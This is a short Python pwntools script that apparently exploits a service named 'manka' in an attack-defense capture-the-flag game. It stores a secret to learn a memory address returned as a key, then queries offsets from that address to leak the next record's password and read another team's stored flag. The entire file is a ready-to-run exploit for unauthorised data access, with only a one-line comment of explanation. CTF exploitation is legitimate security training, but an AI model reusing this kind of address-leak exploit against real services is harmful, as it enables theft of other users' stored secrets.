#!/usr/bin/env python3

from pwn import *
import string
import time
from  checklib import * 
import sys

context.log_level = 'warn'

secret_size = 40
address = sys.argv[1]
port = 7191
TASKNAME = 'manka'
ALPH = string.digits + string.ascii_letters


def get_flag(key, password):
    conn = remote(address, port)
    conn.recvuntil(b': ')
    conn.sendline(b'2')
    conn.recvuntil(b': ')
    conn.sendline(key)
    conn.recvuntil(b': ')
    conn.sendline(password)
    conn.recvuntil(b': ')
    stored_secret = conn.recv(secret_size + 1).replace(b'\0', b'').replace(b'\n', b'')
    conn.close()
    return stored_secret

def value_as_password_vuln(attack_key, attack_value):
    """Using a secret's address as the key lets us read password from the
    next struct in memory."""
    attack_key_addr = int(attack_key, 16)
    content_addr = str(hex(attack_key_addr + 40)).encode()
    attack_next_addr = str(hex(attack_key_addr + 80)).encode()
    secret_pass = get_flag(content_addr, attack_value)
    time.sleep(40)
    next_flag = get_flag(attack_next_addr, secret_pass)
    return next_flag


def send_flag(secret, password):
    conn = remote(address, port)
    conn.recvuntil(b': ')
    conn.sendline(b'1')
    conn.recvuntil(b': ')
    conn.sendline(secret)
    conn.recvuntil(b': ')
    conn.sendline(password)
    conn.recvuntil(b': ')
    key = conn.recvline().replace(b'\n', b'')
    conn.close()
    return key

attack_value = rnd_string(8)
attack_key = send_flag(attack_value, b"1234")

print(value_as_password_vuln(attack_key, attack_value), flush=True)
